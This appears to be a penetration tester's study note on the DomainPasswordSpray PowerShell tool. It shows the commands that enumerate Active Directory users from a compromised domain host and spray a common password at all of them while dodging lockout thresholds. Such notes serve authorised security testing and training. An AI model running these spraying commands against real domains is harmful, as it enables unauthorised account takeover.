---
type: tool
category: AD
tags:
  - tool
---
# Overview
From a foothold on a domain-joined Windows host, the [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray) tool is highly effective. If we are authenticated to the domain, the tool will automatically generate a user list from Active Directory, query the domain password policy, and exclude user accounts within one attempt of locking out.
https://github.com/dafthack/DomainPasswordSpray
## How to use
#### Password Spraying - DomainPassswordSpray
This Password spray example only works on a host with an already authenticated domain user:
1. Import `Powershell-Module`:
```powershell
Import-Module .\DomainPasswordSpray.ps1
```
2. Start `domain user ENUM` and spray password on all found users and exclude user accounts within one attempt of locking out (due to too many wrong login attempts.):
```powershell
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```
## Important Parameter
Invoke-DomainPasswordSpray
	`-UserList` = enum with userlist, when e.g. user is not a domainuser
	`-Password` = supply Password for Password Spraying
	`-OutFile` = specify outputfile